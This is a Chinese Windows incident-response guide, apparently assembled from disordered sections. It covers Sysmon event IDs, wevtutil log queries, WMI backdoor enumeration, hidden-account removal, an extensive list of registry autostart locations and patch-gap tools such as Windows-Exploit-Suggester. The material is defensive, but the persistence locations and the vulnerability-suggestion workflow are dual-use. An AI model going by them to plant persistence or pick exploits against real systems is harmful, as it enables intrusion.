CreateRemoteThread事件检测一个进程何时在另一个进程中创建线程。恶意软件使用此技术来注入代码并隐藏在其他进程中。该事件指示源和目标进程。它提供了有关将在新线程中运行的代码的信息：StartAddress，StartModule和StartFunction。请注意，将推断StartModule和StartFunction字段，如果起始地址在已加载的模块或已知的导出函数之外，则它们可能为空。

事件ID 9：RawAccessRead

RawAccessRead事件检测进程何时使用\。\表示从驱动器进行读取操作。恶意软件通常使用此技术来对已锁定以供读取的文件进行数据泄漏，并避免使用文件访问审核工具。该事件指示源进程和目标设备。

事件ID 10：ProcessAccess

当一个进程打开另一个进程时，该进程访问事件报告，该操作通常伴随着信息查询或读写目标进程的地址空间。这样可以检测黑客工具，这些工具读取诸如本地安全机构（Lsass.exe）之类的进程的内存内容，以窃取凭据以用于“哈希传递”攻击。如果存在活动的诊断实用程序，这些实用程序会反复打开进程以查询其状态，则启用它可能会产生大量的日志记录，因此通常只应使用删除预期访问的过滤器来启用它。

事件ID 11：FileCreate

创建或覆盖文件时，将记录文件创建操作。该事件对于监视自动启动位置（如启动文件夹）以及临时目录和下载目录很有用，这些位置是恶意软件在初始感染期间掉落的常见位置。

事件ID 12：RegistryEvent（对象创建和删除）

注册表项和值的创建和删除操作映射到此事件类型，这对于监视注册表自动启动位置的更改或特定的恶意软件注册表修改很有用。

Sysmon使用注册表根键名的缩写版本，具有以下映射：

 键名 缩写 HKEY_LOCAL_MACHINE HKLM HKEY_USERS HKU HKEY_LOCAL_MACHINE\System\ControlSet00x HKLM\System\CurrentControlSet HKEY_LOCAL_MACHINE\Classes HKCR 事件ID 13：RegistryEvent（值集）

此注册表事件类型标识注册表值修改。该事件记录为DWORD和QWORD类型的注册表值写入的值。

事件ID 14：RegistryEvent（键和值重命名）

注册表键和值重命名操作映射到此事件类型，记录重命名的键或值的新名称。

事件ID 15：FileCreateStreamHash

此事件在创建命名文件流时记录，并生成事件，该事件记录该流所分配到的文件内容（未命名流）以及命名流的内容的哈希。有一些恶意软件变体会通过下载浏览器来删除其可执行文件或配置设置，并且该事件旨在基于基于附加了Zone.Identifier“网络标记”流的浏览器来捕获它们。

事件ID 16：ServiceConfigurationChange

此事件记录Sysmon配置中的更改-例如，更新过滤规则时。

事件ID 17：PipeEvent（已创建管道）

创建命名管道时，将生成此事件。恶意软件通常使用命名管道进行进程间通信。

事件ID 18：PipeEvent（已连接管道）

在客户端和服务器之间建立命名管道连接时，将记录此事件。

事件ID 19：WmiEvent（检测到WmiEventFilter活动）

注册WMI事件筛选器（恶意软件执行该方法）后，此事件将记录WMI名称空间，筛选器名称和筛选器表达式。

事件ID 20：WmiEvent（检测到WmiEventConsumer活动）

此事件记录WMI使用者的注册，记录使用者名称，日志和目的地。

事件ID 21：WmiEvent（检测到WmiEventConsumerToFilter活动）

当使用者绑定到过滤器时，此事件记录使用者名称和过滤器路径。

事件ID 22：DNSEvent（DNS查询）

当进程执行DNS查询时，无论结果是否成功，是否缓存，都会生成此事件。

事件ID 23：FileDelete（检测到文件删除）

文件已删除

事件ID 255：错误

Sysmon中发生错误时，将生成此事件。如果系统负载沉重，某些任务无法执行，或者Sysmon服务中存在错误，则可能发生这种情况。您可以在Sysinternals论坛或Twitter（@markrussinovich）上报告任何错误。

### 3. taskkill

taskkill 主要为终止进程操作，需要注意的是使用该命令时，cmd 命令行最好使用管理员权限，常用命令如下：

 `taskkill /pid 9688
taskkill /f /pid 9688           //强制终止进程pid为9688的进程，/f为强制终止
taskkill /t /pid 9688           //终止pid为9688进程及其子进程，/t为终止指定的进程和由它启用的子进程

```

### 3. wevtutil

`wevtutil.exe` 是 Windows 自带的查询日志的命令行工具

查询日志来源为默认的 `evtx` 日志文件：

 `C:\Windows\System32\winevt\Logs\                    # 日志文件目录

```
 相关参数的简单用法官方文档内有部分解释：

https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil

 - 这里写一下基本用法，因为我们基本只是涉及到查询，所以都围绕查询输出一些常用知识
 - 可以与`findstr`搭配使用

 常用参数 解析 示例 示例解析 qe 从指定的某类日志中查询 wevtutil qe Security 查询安全日志 /q 自定义 XPath格式查询事件可以多语句查询 /q:"Event/System/EventID=4624" 筛选事件id为4624的日志 /f 输出格式一般有xml、text等 /f:text text格式输出 /c 理解为输出的条数默认为倒序所以直接输出都是最早的日志 /c:10 输出10条 /rd 正序查询或倒序查询默认true为倒序false为正序 /rd:false 正序查找，从最近开始 /epl 导出日志 /epl System xxx.evtx 将System日志导出到xxx.evtx 根据常用查询参数，编写了部分查询命令，可以自行根据想要的信息更改参数

需要注意的是/q后跟为XPath格式查询语句，内容非常多，此处只是列举部分常规排查会用得到的参数

展示的内容一般比较多，与`findstr`搭配查询关键字

查找安全日志中，事件ID为4624（登录成功）的日志，输出最近10条：

 `wevtutil qe Security /q:"Event/System/EventID=4624" /f:text /rd:false /c:10

```

查找安全日志中，事件ID为4624（登录成功），并且登陆类型为10（远程 RDP 登录）的日志，输出最近3条：

 `wevtutil qe security /q:"*[EventData[Data[@Name='LogonType']='10'] and System[(EventID=4624)]]" /f:text /rd:false /c:3

```

当前操作系统没有被远程 RDP 登录过，所以为空

查找安全日志中，目标账户名为'XXX'的日志:

 `wevtutil qe security /q:"Event/EventData/Data[@Name='TargetUserName']='XXX'" /f:text /rd:false /c:3

```

查找安全日志中，在2022-06-28 20:13到2022-06-28 22:06期间所有事件id为4624（登录成功）的日志：

 `wevtutil qe security /q:"*[System [TimeCreated[@SystemTime <'2022-06-28T14:06:20' and @SystemTime >'2022-06-28T12:13:51']]] and Event/System/EventID=4624" /f:text /rd:false

```
 需要注意的是：时间查询也支持时间戳查询，但是建议时间区间查询按照如上方式 ，是在日志中详细信息选项内获取

同时该时间格式 2022-06-28T12:13:51.598599500Z

T表示分隔符，Z表示的是UTC。 UTC：世界标准时间，在标准时间上加上8小时，即东八区时间，也就是北京时间。

换算可得：2022-06-28T12:13:51.598599500Z  <==>  2022-06-28 20:13:51

### 3. Windows-Exploit-Suggester

Windows-Exploit-Suggester.py脚本根据Microsoft官方的漏洞补丁库与本地系统信息进行比较，列出当前系统可能存在的漏洞及对应补丁

但是已经很久没更新了

 - 微软公开漏洞库下载地址：

 http://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982

http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx

 - Windows-Exploit-Suggester.py脚本地址：

 https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

 - 需要python 2.X环境，及外部库，自行pip install安装即可

 使用方法如下：

 - 1.首先更新微软漏洞库文件

 `python windows-exploit-suggester.py --update        //进行更新微软漏洞库文件，建议每次都先update一下

```

 - 2.将目标服务器的`systeminfo`命令执行的结果复制保存到本地

 - 3.本地使用`systeminfo`命令结果进行检测：

 `python windows-exploit-suggester.py -d 2022-03-10-mssb.xls -i win10.txt

```
 命令结果如下：

### 3. 查询所有 <code>WMI</code> 中存在的过滤器、消费者、绑定

`$namespaces = Get-WmiObject -Namespace "root" -Class "__NAMESPACE"

foreach ($namespace in $namespaces) {
    $namespaceName = $namespace.Name
    $filterInstances = Get-WmiObject -Namespace "root\$namespaceName" -Query "SELECT * FROM __EventFilter"
    $consumerInstances = Get-WmiObject -Namespace "root\$namespaceName" -Query "SELECT * FROM __EventConsumer"
    $bindings = Get-WmiObject -Namespace "root\$namespaceName" -Class "__FilterToConsumerBinding"

    Write-Host "【 Namespace: $namespaceName 】"
    Write-Host "-------------------------"
    Write-Host "Event Filters:"
    Write-Host "-----------------"
    foreach ($filter in $filterInstances) {
        $filterName = $filter.Name
        Write-Host "Filter Name: $filterName"
    }

    Write-Host "Event Consumers:"
    Write-Host "-----------------"
    foreach ($consumer in $consumerInstances) {
        $consumerName = $consumer.Name
        Write-Host "Consumer Name: $consumerName"
    }

    Write-Host "Bindings:"
    Write-Host "-----------------"
    foreach ($binding in $bindings) {
        $filterPath = $binding.Filter
        $consumerPath = $binding.Consumer

        $filter = $filterInstances | Where-Object { $_.__RELPATH -eq $filterPath }
        $consumer = $consumerInstances | Where-Object { $_.__RELPATH -eq $consumerPath }

        if ($filter -and $consumer) {
            $filterName = $filter.Name
            $consumerName = $consumer.Name

            Write-Host "Binding:"
            Write-Host "Filter Name: $filterName"
            Write-Host "Consumer Name: $consumerName"
        }
    }

    Write-Host ""
}

```
 【 Windows Server 2016 】默认情况

 `【 Namespace: subscription 】
-------------------------
Event Filters:
-----------------
Filter Name: SCM Event Log Filter
Event Consumers:
-----------------
Consumer Name: SCM Event Log Consumer
Bindings:
-----------------
Binding:
Filter Name: SCM Event Log Filter
Consumer Name: SCM Event Log Consumer

剩下都是空的

```

### 3) wmic查询用户

可以通过wmic命令进行查询用户，并且该命令可以直接查询到用户的详细数据，包括隐藏账户

 `wmic useraccount get /value                             # 查询用户的详细数据
wmic useraccount get Name,Status,sid            # 查询目前有哪些用户，以及是否启用，Status标志位为：OK/Degraded，OK为启用状态

```

【 Windows Server 2016 】默认情况

 `AccountType=512
Caption=WIN-UBB04JA2U5V\Administrator
Description=管理计算机(域)的内置帐户
Disabled=FALSE
Domain=WIN-UBB04JA2U5V
FullName=
InstallDate=
LocalAccount=TRUE
Lockout=FALSE
Name=Administrator
PasswordChangeable=TRUE
PasswordExpires=TRUE
PasswordRequired=TRUE
SID=S-1-5-21-3421588695-3868107595-1594673911-500
SIDType=1
Status=OK

AccountType=512
Caption=WIN-UBB04JA2U5V\DefaultAccount
Description=系统管理的用户帐户。
Disabled=TRUE
Domain=WIN-UBB04JA2U5V
FullName=
InstallDate=
LocalAccount=TRUE
Lockout=FALSE
Name=DefaultAccount
PasswordChangeable=TRUE
PasswordExpires=FALSE
PasswordRequired=FALSE
SID=S-1-5-21-3421588695-3868107595-1594673911-503
SIDType=1
Status=Degraded

AccountType=512
Caption=WIN-UBB04JA2U5V\Guest
Description=供来宾访问计算机或访问域的内置帐户
Disabled=TRUE
Domain=WIN-UBB04JA2U5V
FullName=
InstallDate=
LocalAccount=TRUE
Lockout=FALSE
Name=Guest
PasswordChangeable=FALSE
PasswordExpires=FALSE
PasswordRequired=FALSE
SID=S-1-5-21-3421588695-3868107595-1594673911-501
SIDType=1
Status=Degraded

AccountType=512
Caption=WIN-UBB04JA2U5V\root
Description=
Disabled=FALSE
Domain=WIN-UBB04JA2U5V
FullName=
InstallDate=
LocalAccount=TRUE
Lockout=FALSE
Name=root
PasswordChangeable=TRUE
PasswordExpires=TRUE
PasswordRequired=TRUE
SID=S-1-5-21-3421588695-3868107595-1594673911-1001
SIDType=1
Status=OK

```

### 3. 用户登录自启动目录

具体路径如下:

 `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\Users\root\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

// 对于新创建的用户，设置其家目录时会从下面这个目录拷贝文件，完成家目录的创建，本身并不会自动执行
C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

```
 本目录下存放着用户登录自启的程序及相关文件等，同时在本目录下的启动文件

【 Windows Server 2016 】 默认情况

### 3. 注册表查看计划任务

我们将注册表部分分为两类

 - 计划任务服务本身的注册表
 - 计划任务实际任务的注册表

 就像是房屋售卖机构，一个是房屋售卖机构的位置，也就是售楼处；一个是售卖的房屋的位置

### 3) 查看进程关联的活动服务

`tlist -s                        //列出所有进程关联的活动服务
tlist -s 10296          //列出指定进程的关联活动服务

```

### 3) 启动失败默认操作

点击服务项后，右键选择属性 -> 恢复

这里定义了服务失败时触发的操作，如果设置的是运行一个程序，并且在图中运行程序处指定了非默认程序，则需要重点关注

### 3. 被删除的用户家目录

经过测试，默认情况下如果用户被删除，其家目录是不会被删除的，可以通过对比用户家目录和用户，查看是否存在异常

### 3. 浏览器插件

### 3. 杀毒程序扫描

这个就不多说了，大家选择已有或者合适的杀毒程序

### 3. 防火墙出入站策略

`win + r` 中输入

 `gpedit.msc

```

【 Windows Server 2016 】 默认情况

### 4. 删除隐藏账户

常规删除账户可以通过命令行或者图形化删除，但是对于一些隐藏账户会删除失败，可以通过D盾工具或直接去注册表删除

以 `admin$` 克隆 `Administrator` 账户的 `F` 值为例，D盾检测出来后，右键删除其实是删除了

 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$

```
 这个注册表项，但是对于下面的注册表并没有删除

 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA

```
 这种删除有效，但严格来说不够完整，可以去注册表删除用户对应的注册表

删除注册表失败可能是权限不够，修改权限或者通过 `psexec`以 `SYSTEM` 权限打开注册表编辑器就可以了，一定要确定好删除的是恶意账号，别删除错了

### 4. Get-NetworkConnection

这是一个开源脚本，通过 Powershell 编写，可以获取网络连接的时间戳

https://github.com/IllusiveNetworks-Labs/Get-NetworkConnection

### 4. 系统信息(msinfo32)

不知道这个程序是从哪代 Windows 加进来的，可以查看的信息不少

`win + r` 之后输入 `msinfo32` 或者直接搜索系统信息

### 4) Powershell 查找隐藏账户

直接打开 Powershell 窗口或在 cmd 窗口中输入  `Powershell` 进入 Powershell  命令行

 `Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID

```

【 Windows Server 2016 】 默认情况

### 4. Powershell

poweshell为windows自带的一种更深入系统内部的命令行脚本环境，可以通过相应的命令对进程进行查询及操作。

win+r输入：`Powershell`

cmd中输入：`Powershell`

Powershell的命令结构一般是动词+名词

打开Powershell环境后，可以通过

 `get-help *process*  //查找所有process相关命令的帮助，*为通配符

```

本次只涉及如下命令

 - Get-Process                         //相当于`tasklist`命令，直接列出进程
 - Format-list *                       //组合使用，列出进程的详细信息
 - Stop-Process                      //暂停进程

### 4. PowerShell

除非你想快速确认某些内容并且有写好的 `Powershell` 脚本或者做自动化日志分析处理，不然不是很建议使用 `Powershell` 查询日志

Windows PowerShell同样提供了日志查询的相关命令程序：

 - `Get-WinEvent`

 - `Get-EventLog`

 这两个PowerShell的命令程序优点是它们将结果作为PowerShell对象返回，所以可以支持用户操作和格式化这些返回，如 Select、Select-String、Format-List

关于这两个命令程序的区别，腾讯云开发者社区的雷龙写了一篇文章，从功能性到效率都做了讲解，推荐看下：

《Get-WinEvent和Get-EventLog的区别及效率》

https://cloud.tencent.com/developer/article/1879732

Get-EventLog

https://learn.microsoft.com/zh-cn/Powershell/module/microsoft.Powershell.management/get-eventlog?view=Powershell-5.1&viewFallbackFrom=Powershell-7.2

 - 用于旧版本的 Windows PowerShell，与 Windows Event Log 服务交互
 - 可以获取指定日志名称的事件日志条目
 - 常见用法示例：Get-EventLog -LogName System

 Get-WinEvent

https://learn.microsoft.com/zh-cn/Powershell/module/microsoft.Powershell.diagnostics/get-winevent?view=Powershell-7.2

 - 用于较新版本的 Windows PowerShell（从 Windows PowerShell 3.0 开始）
 - 通过 Windows 事件日志 API（Event Log Service）与事件日志交互
 - 提供更丰富的选项，例如条件过滤、排序、格式化等
 - 可以使用强大的筛选器来选择特定的事件日志条目
 - 常见用法示例：Get-WinEvent -LogName System

### 4. public 目录

也就是公用目录，如上图所示

 `C:\Users\Public

```

### 4. ShimCache

ShimCache（也称为AppCompatCache）是Windows操作系统中的一个功能，用于记录和缓存应用程序的兼容性信息。它主要用于加快应用程序的启动速度，并提供对应用程序的兼容性修复和调整的支持。

以下是ShimCache的一些功能和用途：

 - 加速应用程序启动：ShimCache会缓存应用程序的兼容性信息，包括应用程序的修复补丁、设置和调整等。当用户再次启动一个应用程序时，Windows会检查ShimCache以获取该应用程序的兼容性信息，从而加快应用程序的启动速度。
 - 兼容性修复和调整：ShimCache可以存储应用程序的兼容性修复和调整信息。当应用程序启动时，Windows会应用这些修复和调整来解决潜在的兼容性问题，以确保应用程序在当前操作系统上正常运行。
 - 应用程序兼容性数据库：ShimCache实际上是一个应用程序兼容性数据库，其中包含了大量应用程序的兼容性信息。这些信息包括修复补丁、设置、调整和其他与应用程序兼容性相关的数据。Windows可以根据这些信息自动应用修复和调整，以提高应用程序的兼容性。

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

```

解析工具

https://github.com/EricZimmerman/AppCompatCacheParser/

 `AppCompatCacheParser.exe --csv ./ --csvf results.csv

```
 生成的 `csv` 文件可以通过 Excel 或者 WPS 文件打开

这里面标记了文件上次修改的时间、是否执行过等信息

### 4. WES-NG

Windows Exploit Suggester - Next Generation (WES-NG)

https://github.com/bitsadmin/wesng

声称是下一代 Windows Exploit Suggester

具体使用方法可以查看 `Github` 上的项目详情

### 4. 删除 WMI 后门

这里以 `\root\subscription` 命名空间为例

### 4. wmic

`wmic service

```
 这样会显示出所有服务的所有信息，比较乱套，尝试选择部分写入到 `CSV` 文件中

 `wmic service get Name, DisplayName, Description, PathName, StartMode, StartName /FORMAT:CSV > services.csv

```

是以逗号为分隔符号的 `CSV` 文件，使用 `Excel` 打开需要设定分隔符为逗号

第一行会出现空行，可以删除掉，这样方便筛选

如果只想查询某一项服务

 `wmic service where "Name='ServiceName'" get Name, DisplayName, Description, PathName, StartMode, StartName

```

### 4. 注册表查看启动项

以下为注册表中启动项相关的所有位置，建议都排查一遍：

 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce [此条默认不存在，创建可用]
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx [此条默认不存在，创建可用]
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx  [此条默认不存在，创建可用]

// 下面两个其他文章中可能没写过，甚至官方的 autoruns 也发现不了
// 其中 {SID} 替换成用户的 SID 值
HKEY_USERS\{SID}\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_USERS\{SID}\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon [自动登录相关的注册表项]

// 用于设置启动文件夹项
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

// 用于设置服务自动启动 (默认并不存在)
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices

// 通过策略设置启动项
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

// 利用身份验证包自启动和SSP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\ 的 Authentication Packages 和 Security Packages 的值
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig

// 事件提供程序
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\

// Winlogon 帮助程序，主要是用户登录时执行的程序，需要检查注册表下的子注册表当前的键值对
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon

// 端口监视器
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors

// 打印处理器
HKEY_LOCAL_MACHINE\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver

// Active Setup
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\*\StubPath

// 登录脚本
HKEY_CURRENT_USER\Environment\UserInitMprLogonScript

// 以下注册表可能不存在，如果存在也需要关注
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run

```
 这里需要注意：上面包含 {SID} 的两条每个用户只能查看自己的内容，无法查看其他用户的，即使你是管理员，所以如果你发现恶意程序是以某个用户起的，一定查查该用户对应的注册表项

利用 `reg query` 和 `&` 进行命令拼接进行查询，如下(建议使用 `&` 而不是 `&&`)：

 `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce & reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

```

我给大家准备了 `Powershell` 查询脚本，可以将要查询的内容填写进去，下面代码里只填写了几条作为案例

 `$registryPaths = @(
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx",
    "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx"
)

foreach ($path in $registryPaths) {
    $hive = $path.Substring(0, $path.IndexOf("\"))

    switch ($hive) {
        "HKEY_LOCAL_MACHINE" { $root = "HKLM:" }
        "HKEY_CURRENT_USER" { $root = "HKCU:" }
        "HKEY_CLASSES_ROOT" { $root = "HKCR:" }
        "HKEY_USERS" { $root = "HKU:" }
        "HKEY_CURRENT_CONFIG" { $root = "HKCC:" }
        default {
            Write-Host "Invalid registry hive: $hive"
            continue
        }
    }

    $subKey = $path.Substring($path.IndexOf("\") + 1)

    if (Test-Path "$root\$subKey") {
        Write-Host "Registry Path: $path"
        Write-Host "---------------------------"

        $keys = Get-ItemProperty -Path "$root\$subKey"
        if ($keys) {
            foreach ($key in $keys.PSObject.Properties) {
                if ($excludedProperties -notcontains $key.Name) {
                    Write-Host "Key   : $($key.Name)"
                    Write-Host "Value : $($key.Value)"
                    Write-Host
                }
            }
        } else {
            Write-Host "No keys found."
        }
    } else {
        Write-Host "Registry Path: $path - Not Found"
        Write-Host
    }

    Write-Host
}

```

Windows 系统级注册表文件存储位置如下

 - 注册表文件（系统级）：

 - `%SystemRoot%\System32\Config` 目录下的以下文件：`DEFAULT`, `SAM`, `SECURITY`, `SOFTWARE`, `SYSTEM`

 - `%SystemRoot%\System32\Config\RegBack` 目录下的备份文件（备份文件的扩展名为 `.bak`）

 - 注册表文件（用户级）：

 - 默认配置文件：`%SystemRoot%\System32\Config\Default`

 - 默认用户配置文件：`%SystemRoot%\System32\Config\DefaultUser`

 - 用户配置文件：每个用户在其用户文件夹中的 `NTUSER.DAT` 文件

 不建议直接修改该文件，当然了，默认情况也不让直接修改

【 Windows Server 2016 】 默认情况

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x29d2fe81
    ShutdownFlags    REG_DWORD    0x8000022b

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\AlternateShells

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
    DefaultShell    REG_SZ    explorer.exe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells
    30000    REG_SZ    cmd.exe /c "cd /d "%USERPROFILE%" & start cmd.exe /k runonce.exe /AlternateShellStartup"
    60000    REG_SZ    explorer.exe

```

 `C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\AutoLogonChecked

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\VolatileUserMgrKey

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\1
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\2

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\VolatileUserMgrKey\1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\1\S-1-5-21-1129105344-1658940625-3319276557-500

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\VolatileUserMgrKey\1\S-1-5-21-1129105344-1658940625-3319276557-500

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\VolatileUserMgrKey\2

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\2\S-1-5-21-1129105344-1658940625-3319276557-500

C:\Users\Administrator>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\VolatileUserMgrKey\2\S-1-5-21-1129105344-1658940625-3319276557-500

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\2\S-1-5-21-1129105344-1658940625-3319276557-500
    contextLuid    REG_QWORD    0x6c96c

C:\Users\Administrator>

```

### 4. 计划任务目录文件

计划任务服务会讲所有设置的计划任务保存一份儿到文件，具体路径为

 `C:\Windows\System32\Tasks

```

使用记事本打开相关文件

这里提一点，修改计划任务文件不会影响计划任务的执行，通过计划任务程序修改计划任务的属性或者禁止计划任务再启动后，会将计划任务内容写入到计划任务文件中

删除计划任务文件不耽误计划任务执行，也不耽误计划任务显示

### 4) 查询指定进程使用的模块

